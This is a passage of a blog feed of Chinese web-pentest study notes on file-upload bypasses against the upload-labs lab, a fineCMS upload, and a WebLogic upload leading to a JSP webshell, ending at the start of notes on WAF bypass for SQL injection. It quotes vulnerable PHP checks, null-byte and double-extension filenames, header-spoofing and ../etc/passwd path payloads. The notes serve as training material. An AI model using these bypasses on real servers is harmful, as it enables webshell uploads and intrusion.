id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/upload-labs/Pass-10/index.php</span><br></pre></td></tr></table></figure><p>将黑名单里的后缀名替换为空且只替换一次，因此可以用双写绕过，写为1.pphphp。</p><p><strong>检测代码</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line">if (isset($_POST[&#x27;submit&#x27;])) &#123;</span><br><span class="line">    if (file_exists($UPLOAD_ADDR)) &#123;</span><br><span class="line">        $deny_ext = array(&quot;php&quot;,&quot;php5&quot;,&quot;php4&quot;,&quot;php3&quot;,&quot;php2&quot;,&quot;html&quot;,&quot;htm&quot;,&quot;phtml&quot;,&quot;jsp&quot;,&quot;jspa&quot;,&quot;jspx&quot;,&quot;jsw&quot;,&quot;jsv&quot;,&quot;jspf&quot;,&quot;jtml&quot;,&quot;asp&quot;,&quot;aspx&quot;,&quot;asa&quot;,&quot;asax&quot;,&quot;ascx&quot;,&quot;ashx&quot;,&quot;asmx&quot;,&quot;cer&quot;,&quot;swf&quot;,&quot;htaccess&quot;);</span><br><span class="line"></span><br><span class="line">        $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]);</span><br><span class="line">        $file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name); 替换为空</span><br><span class="line">        if (move_uploaded_file($_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;], $UPLOAD_ADDR . &#x27;/&#x27; . $file_name)) &#123;</span><br><span class="line">            $img_path = $UPLOAD_ADDR . &#x27;/&#x27; .$file_name;</span><br><span class="line">            $is_upload = true;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $msg = $UPLOAD_ADDR . &#x27;文件夹不存在,请手工创建！&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>绕过</strong></p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211111039.png" alt="image-20210903171716498"></p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211110724.png" alt="image-20210903171734036"></p><h3 id="白名单-1"><a href="#白名单-1" class="headerlink" title="白名单"></a>白名单</h3><h4 id="00截断"><a href="#00截断" class="headerlink" title="00截断"></a>00截断</h4><p>00截断分为%00截断和0x00截断。当一个字符串中存在空字符的时候，在被解析的时候会导致空字符后面的字符被丢弃。</p><h6 id="利用条件："><a href="#利用条件：" class="headerlink" title="利用条件："></a>利用条件：</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.后缀检测，合格则进行上传路径拼接（白名单）</span><br><span class="line">2.拼接路径和文件名，组成文件上传路径</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">截断条件：php版本小于5.3.4，php的magic_quotes_gpc为OFF状态</span><br></pre></td></tr></table></figure><h6 id="利用（满足其中一个就行）"><a href="#利用（满足其中一个就行）" class="headerlink" title="利用（满足其中一个就行）"></a>利用（满足其中一个就行）</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.路径拼接直接使用的 $file_name这个文件名，而不是 $file_ext和其他什么东西来拼成一个文件名字，这时文件名中还是包含截断字符的，路径拼好之后可以被截断成想要的.php。</span><br><span class="line">2.文件路径可控，比如我可以修改路径拼接的path时，比如抓到的包中存在path: uploads/，就可以直接把路径构造成uploads/xxx.php%00</span><br></pre></td></tr></table></figure><h5 id="00截断-1"><a href="#00截断-1" class="headerlink" title="%00截断"></a>%00截断</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">www.xxx.com/qq.jpg</span><br><span class="line">www.xxx.com/qq.php%00.jpg =&gt; www.xxx.com/qq.php</span><br></pre></td></tr></table></figure><p><strong>%00截断 GET用法</strong></p><p>当是GET接收情况的时候，直接用 %00 就可以了。</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211110731.png" alt="image-20210903173641511"></p><p>某些情况下，直接在文件名中加 %00 进行截断这是不对的，因为 %00 会以字符串的形式解析了。</p><p>如果没有做后缀名判断的情况下，那样会变成：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">www.xxx.com/qq.php%00.jpg =&gt; www.xxx.com/qq.php%00.jpg</span><br></pre></td></tr></table></figure><p>也就是所谓的任意文件上传漏洞了，这又是另一个概念了。</p><p><strong>%00截断 POST 用法</strong></p><p>当是POST接收情况的时候，正确的用法应该是我们需要对 %00 做一个URL解码，也就是URL-decode；</p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211112756.png" alt="image-20210903173834255" style="zoom:50%;" /><p>为什么两者用法不同？</p><p>这是因为 %00 截断在 GET 中被 url 解码之后是空字符。但是在 POST 中 %00 不会被 url 解码，所以只能通过 burpsuite 修改 hex 值为 00 （URL decode）进行截断。</p><p>注意：</p><p>有些时候数据包中必须含有<strong>上传文件后的目录</strong>情况才可以用。</p><p>例如：数据包中存在 path: uploads/，那么攻击者可以通过修改path的值来构造paylod: uploads/aa.php%00</p><p>像以下这个PHP文件上传检测代码，这个就需要有上传文件后的目录才能用。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$uploaded_name = $_FILES[ &#x27;file&#x27; ][ &#x27;name&#x27; ];</span><br><span class="line">$uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, &#x27;.&#x27; ) + 1); // 提取上传文件后缀</span><br><span class="line">$target_name = md5( uniqid() . $uploaded_name ) . &#x27;.&#x27; . $uploaded_ext; // 对上传文件进行重命名</span><br><span class="line">if( ( strtolower( $uploaded_ext ) == &quot;jpg&quot; || strtolower( $uploaded_ext ) == &quot;jpeg&quot; || strtolower( $uploaded_ext ) == &quot;png&quot; )) </span><br><span class="line">&#123;  </span><br><span class="line">    move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;],</span><br><span class="line">    $dir . $target_name); // 将临时文件移动到指定目录</span><br><span class="line">    $result = $dir . $target_name;</span><br><span class="line">    echo &quot;Stored in: $result&quot;; </span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    echo &quot;Invalid file&quot;;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>为什么修改path才可以？</p><p>因为程序中检测的是文件的后缀名，如果后缀合法则拼接路径和文件名。</p><p>那么，攻击者修改了path以后的拼接结果为：uploads/aaa.php%00/20190818.php</p><p>移动文件的时候会将文件保存为：uploads/aaa.php</p><p>从而达到Getshell效果。</p><p><strong>例子</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/upload-labs/Pass-11/index.php</span><br></pre></td></tr></table></figure><p><strong>检测代码</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line">if(isset($_POST[&#x27;submit&#x27;]))&#123;</span><br><span class="line">    $ext_arr = array(&#x27;jpg&#x27;,&#x27;png&#x27;,&#x27;gif&#x27;);</span><br><span class="line">    $file_ext = substr($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;],strrpos($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;],&quot;.&quot;)+1);</span><br><span class="line">    if(in_array($file_ext,$ext_arr))&#123;</span><br><span class="line">        $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];</span><br><span class="line">        $img_path = $_GET[&#x27;save_path&#x27;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;</span><br><span class="line"></span><br><span class="line">        if(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = true;</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            $msg = &#x27;上传失败！&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        $msg = &quot;只允许上传.jpg|.png|.gif类型文件！&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>绕过</strong></p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211110729.png" alt="image-20210903174814005"></p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211112535.png" alt="image-20210903174920812"></p><h5 id="0x00截断"><a href="#0x00截断" class="headerlink" title="0x00截断"></a>0x00截断</h5><p>它们最终的结果都是一样的，都代表着chr(0)，即空字符，只不过使用的位置不同，0x00代表16进制的空字符00，需要在HEX中改为00，进行截断，而%00是URL解码之前的字符，它被解码成16进制ASCII码之后实际上也是0x00，所以它们最终都对应的是空字符。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/upload-labs/Pass-12/index.php</span><br></pre></td></tr></table></figure><p><strong>检测代码</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line">if(isset($_POST[&#x27;submit&#x27;]))&#123;</span><br><span class="line">    $ext_arr = array(&#x27;jpg&#x27;,&#x27;png&#x27;,&#x27;gif&#x27;);</span><br><span class="line">    $file_ext = substr($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;],strrpos($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;],&quot;.&quot;)+1);</span><br><span class="line">    if(in_array($file_ext,$ext_arr))&#123;</span><br><span class="line">        $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];</span><br><span class="line">        $img_path = $_POST[&#x27;save_path&#x27;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;</span><br><span class="line"></span><br><span class="line">        if(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = true;</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            $msg = &quot;上传失败&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        $msg = &quot;只允许上传.jpg|.png|.gif类型文件！&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$img_path = $_POST[&#x27;save_path&#x27;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;</span><br><span class="line">这里获取路径用的是POST</span><br></pre></td></tr></table></figure><p><strong>绕过</strong></p><p>方法1:</p><p>因为获取路径用的是POST，所有这里需要在修改一下编码</p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211112581.png" alt="image-20210903193443580" style="zoom:67%;" /><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211112145.png" alt="image-20210903193523935"></p><p>方法2:</p><p>通过0x00绕过</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211112131.png" alt="image-20210903193748953"></p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211110196.png" alt="image-20210903193842023"></p><h5 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://blog.csdn.net/weixin_44840696/article/details/90581104</span><br><span class="line">https://www.fujieace.com/penetration-test/file-upload-00.html#google_vignette</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> 小迪学习笔记 </tag>
            
            <tag> 文件上传 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>20WEB漏洞--文件上传之基础及过滤方式</title>
      <link href="/2021/09/21/20WEB%E6%BC%8F%E6%B4%9E-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B9%8B%E5%9F%BA%E7%A1%80%E5%8F%8A%E8%BF%87%E6%BB%A4%E6%96%B9%E5%BC%8F/"/>
      <url>/2021/09/21/20WEB%E6%BC%8F%E6%B4%9E-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B9%8B%E5%9F%BA%E7%A1%80%E5%8F%8A%E8%BF%87%E6%BB%A4%E6%96%B9%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<p>😆😆😆😆😆😆</p><span id="more"></span><h3 id="知识汇总"><a href="#知识汇总" class="headerlink" title="知识汇总"></a>知识汇总</h3><h4 id="什么是文件上传漏洞？"><a href="#什么是文件上传漏洞？" class="headerlink" title="什么是文件上传漏洞？"></a>什么是文件上传漏洞？</h4><p>凡是存在文件上传的地方，都有可能存在文件上传漏洞。关键是看对方的防护代码写的是否安全，全面，一旦有一个地方可以绕过，就会造成文件上传漏洞。</p><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>文件上传漏洞是指用户上传了一个可执行的脚本文件，并通过此脚本文件获得了执行服务器端命令的能力。文件上传这个功能本身没有问题，有问题的是文件上传后，服务器怎么处理、解释文件。如果服务器的处理逻辑不够安全，就会导致上传的文件被web容器解释执行，从而造成严重的后果</p><h4 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h4><p>可以自定义，可以成为webshell，通过文件上传来上传网站后门，直接获取网站权限，属于高危漏洞。上传漏洞与SQL注入或 XSS相比 , 其风险更大 。可以获取数据库信息，可以对服务器提权，获取内网权限</p><h4 id="判断"><a href="#判断" class="headerlink" title="判断"></a>判断</h4><p>对文件上传进行抓包，然后进行判断</p><h4 id="注意地方"><a href="#注意地方" class="headerlink" title="注意地方"></a>注意地方</h4><p>对文件上传类型进行区分，是属于编辑器文件上传，还是属于第三方应用，还是会员中心。要确保文件上传是什么类型，就用什么类型方法对它进行后期的测试。</p><h4 id="在实际中的应用说明"><a href="#在实际中的应用说明" class="headerlink" title="在实际中的应用说明"></a>在实际中的应用说明</h4><h4 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h4><p>​     先直接传一个PHP，实战先传马。</p><p>​    实战先传一个正常的图片，看看有无返回存储地址。</p><p>​    如果能直接上传并解析，已离成功不远。</p><h4 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h4><p>​     先传一个shell，然后进行修改。</p><p>​    connect-Type:image/jpeg，看看是否可以进行绕过，如果不行，在上传内容添加GIF89a</p><p>​    当然上传了还得看是否能够被解析为php，所有的上传都要考虑是否能够被解析。</p><h4 id="方法三"><a href="#方法三" class="headerlink" title="方法三"></a>方法三</h4><ul><li>上传一个abc.abcd，目的只是为了查看是否为白名单还是黑名单绕过。</li></ul><p>​    黑名单限制一般为此文件类型不允许上传，考虑双写，大小写，空格，php2,php3,php4,php5,pht</p><p>​    phtml,等方式</p><ul><li>我们继续上传一个/htaccess文件</li></ul><p>​    .htaccess文件能够设置服务器的解析文件的格式，匹配到dudu就已php的格式来解析，继而上传马</p><ul><li>如果说.htaccess不能上传，接下来上传一个.user.ini，继而上传一个马</li></ul><h4 id="方法四"><a href="#方法四" class="headerlink" title="方法四"></a>方法四</h4><p>​    如果白名单限制上传</p><ul><li><p>考虑00截断上传</p></li><li><p>文件包含漏洞+图片马</p></li><li><p>文件包含漏洞+二次渲染+图片马</p></li></ul><h4 id="方法五"><a href="#方法五" class="headerlink" title="方法五"></a>方法五</h4><p>​    上传的东西是否被服务器很快的删除或者移除，或者说上传成功，但是无法访问，就得考虑条件竞争。</p><p>​    以上均不行，考虑逻辑层面的思路</p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211109943.png" alt="image-20210902091114907" style="zoom:67%;" /><h3 id="演示案例："><a href="#演示案例：" class="headerlink" title="演示案例："></a>演示案例：</h3><h4 id="常规文件上传地址的获取说明"><a href="#常规文件上传地址的获取说明" class="headerlink" title="常规文件上传地址的获取说明"></a>常规文件上传地址的获取说明</h4><p>通过搜索带有upload关键字的网页</p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211109026.png" alt="image-20210902193733189" style="zoom:67%;" /><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211109915.png" alt="image-20210902193753879" style="zoom:67%;" /><p>通过目录扫描工具进行扫描</p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211109870.png" alt="image-20210902194104791" style="zoom:67%;" /><h4 id="不同格式下的文件类型后门测试"><a href="#不同格式下的文件类型后门测试" class="headerlink" title="不同格式下的文件类型后门测试"></a>不同格式下的文件类型后门测试</h4><p>不要妄想通过一个带有后门的图片后缀的文件来控制网站，关键是要看网站对脚本的解析是什么类型</p><p>什么格式的代码就用什么格式去执行，不可以乱用，否则是执行不了的。</p><h4 id="配合解析漏洞下的文件类型后门测试"><a href="#配合解析漏洞下的文件类型后门测试" class="headerlink" title="配合解析漏洞下的文件类型后门测试"></a>配合解析漏洞下的文件类型后门测试</h4><p>nginx解析漏洞</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211109788.png" alt="image-20210902195233823"></p><p>我们上传一个正常的图片，图片中写如php代码，当我们去访问图片的时候，图片不会执行php代码。</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211109988.png" alt="image-20210902195518809"></p><p>当我们在后面加上1.php后，Nginx就会造成一个解析漏洞，php代码就会被执行。</p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211109161.png" alt="image-20210902200047749" style="zoom:67%;" /><h4 id="本地文件上传漏洞靶场环境搭建测试"><a href="#本地文件上传漏洞靶场环境搭建测试" class="headerlink" title="本地文件上传漏洞靶场环境搭建测试"></a>本地文件上传漏洞靶场环境搭建测试</h4><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211109034.png" alt="image-20210902200322944" style="zoom:50%;" /><p>在客户端通过如下的javascript代码来检测用户提交的文件是否合法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">function checkFile() &#123;</span><br><span class="line">    var file = document.getElementsByName(&#x27;upload_file&#x27;)[0].value;</span><br><span class="line">    if (file == null || file == &quot;&quot;) &#123;</span><br><span class="line">        alert(&quot;请选择要上传的文件!&quot;);</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">    //定义允许上传的文件类型</span><br><span class="line">    var allow_ext = &quot;.jpg|.png|.gif&quot;;</span><br><span class="line">    //提取上传文件的类型</span><br><span class="line">    var ext_name = file.substring(file.lastIndexOf(&quot;.&quot;));</span><br><span class="line">    //判断上传文件类型是否允许上传</span><br><span class="line">    if (allow_ext.indexOf(ext_name + &quot;|&quot;) == -1) &#123;</span><br><span class="line">        var errMsg = &quot;该文件不允许上传，请上传&quot; + allow_ext + &quot;类型的文件,当前文件类型为：&quot; + ext_name;</span><br><span class="line">        alert(errMsg);</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>如何判断是否是客户端js检测</strong></p><p>1、选择一个.php后缀的文件，同时使用burp suite进行抓包</p><p>2、点击上传，可以看到还没有数据经过burp suite，浏览器就已经弹出警示框，说明数据还没有发送给服务器，程序就判断出来文件类型不对，因此就可以得出结论这个是通过客户端进行的本地文件检测</p><p><strong>绕过方法</strong></p><p><strong>第一种</strong></p><p>直接将js代码删除掉就可以了</p><p><strong>第二种</strong></p><p>前端上传一个合法的文件，通过抓包将报文截取，然后修改后缀上传</p><h4 id="某-CMS-及-CVE-编号文件上传漏洞测试"><a href="#某-CMS-及-CVE-编号文件上传漏洞测试" class="headerlink" title="某 CMS 及 CVE 编号文件上传漏洞测试"></a>某 CMS 及 CVE 编号文件上传漏洞测试</h4><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211109721.png" alt="image-20210902201740119"></p><p>可以看到图片上传上去了，但是抓包却抓不到，是因为上传操作是使用JS进行验证，在浏览器前端完成。点击保存才可以抓到包</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211109735.png" alt="image-20210902201911666"></p><p>我们将png修改为php上传</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211109820.png" alt="image-20210902202341242"></p><p>发现报错，而且没有返回路径，但是去后台看发现上传成功了。</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211109828.png" alt="image-20210902202430673"></p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211109878.png" alt="image-20210902202503511"></p><p>又发现了他是fineCMS，去看一他有什么漏洞</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211109434.png" alt="image-20210902202631848"></p><p>找到刚才我们那个的上传路径</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211110126.png" alt="image-20210902202756477"></p><p>通过该路径成功执行代码</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211110727.png" alt="image-20210902203051054"></p><p><strong>weblogic任意文件上传漏洞</strong></p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211109655.png" alt="image-20210902203457158"></p><p>账号是weblogic，密码通过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose logs | grep password 可以查看</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211109690.png" alt="image-20210902205529954"></p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211110204.png" alt="image-20210902205315578"></p><p>点击base_domain</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211109017.png" alt="image-20210902205649769"></p><p>点击高级</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211109043.png" alt="image-20210902205709472"></p><p>启用web测试页面</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211109233.png" alt="image-20210902205735047"></p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211110075.png" alt="image-20210902205955683"></p><p>设置work home dir</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/u01/oracle/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/css</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211109394.png" alt="image-20210902210112246"></p><p>点击安全，进行添加</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211110699.png" alt="image-20210902210338513"></p><p>上传jsp木马</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211109466.png" alt="image-20210902210440625"></p><p>获取时间戳</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1630587866052</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211109563.png" alt="image-20210902211028754"></p><p>然后访问<code>http://your-ip:7001/ws_utc/css/config/keystore/[时间戳]_[文件名]</code>，即可执行webshell：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.47.156:7001/ws_utc/css/config/keystore/1630587866052_3.jsp</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211109672.png" alt="image-20210902211111366"></p><p>执行成功</p>]]></content>
      
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> 小迪学习笔记 </tag>
            
            <tag> 文件上传 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>19WEB漏洞--SQL注入之深入WAF注入绕过</title>
      <link href="/2021/09/21/19WEB%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E6%B7%B1%E5%85%A5WAF%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87/"/>
      <url>/2021/09/21/19WEB%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E6%B7%B1%E5%85%A5WAF%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87/</url>
      
        <content type="html"><![CDATA[<p>😆😆😆😆😆😆</p><span id="more"></span><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>在攻防实战中，往往需要掌握一些特性，比如服务器、数据库、应用层、WAF层等，以便我们更灵活地去构造Payload，从而可以和各种WAF进行对抗，甚至绕过安全防御措施进行漏洞利用。</p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211108006.png" alt="image-20210830195504797" style="zoom:67%;" /><h3 id="白名单"><a href="#白名单" class="headerlink" title="白名单"></a>白名单</h3><p><strong>方式一：IP 白名单</strong> </p><p>从网络层获取的 ip，这种一般伪造不来，如果是获取客户端的 IP，这样就可能存在伪造 IP 绕过的情 况。</p><p> 测试方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">修改 http 的 header 来 bypass waf</span><br><span class="line"></span><br><span class="line">X-forwarded-for </span><br><span class="line">X-remote-IP </span><br><span class="line">X-originating-IP </span><br><span class="line">x-remote-addr</span><br><span class="line">X-Real-ip</span><br></pre></td></tr></table></figure><p> <strong>方式二：静态资源</strong></p><p> 特定的静态资源后缀请求，常见的静态文件(.js .jpg .swf .css 等等)，类似白名单机制，waf 为了检测 效率，不去检测这样一些静态文件名后缀的请求。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://10.9.9.201/sql.php?id=1 </span><br><span class="line">http://10.9.9.201/sql.php/1.js?id=1 </span><br></pre></td></tr></table></figure><p>备注：Aspx/php 只识别到前面的.aspx/.php 后面基本不识别 </p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211108102.png" alt="image-20210901200253535" style="zoom:50%;" /><p>方式三：url 白名单 </p><p>为了防止误拦，部分 waf 内置默认的白名单列表，如 admin/manager/system 等管理后台。只要 url 中存在白名单的字符串，就作为白名单不进行检测。常见的 url 构造姿势：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sql.php/admin/php?id=1</span><br><span class="line">http://127.0.0.1/sql.php?a=/manage/&amp;b=../etc/passwd</span><br><span class="line">http://127.0.0.1/../../../manage/../sql.asp?id=2</span><br></pre></td></tr></table></figure><p>waf通过/manage/进行比较，只要url中存在/manage/就作为白名单不进行检测，这样我们可以通过/sql.php?1=manage/&amp;b=../etc/passwd绕过防御规则。</p><h3 id="爬虫白名单"><a href="#爬虫白名单" class="headerlink" title="爬虫白名单"></a>爬虫白名单</h3><h4 id="原理"><a href="#原理" class="headerlink" 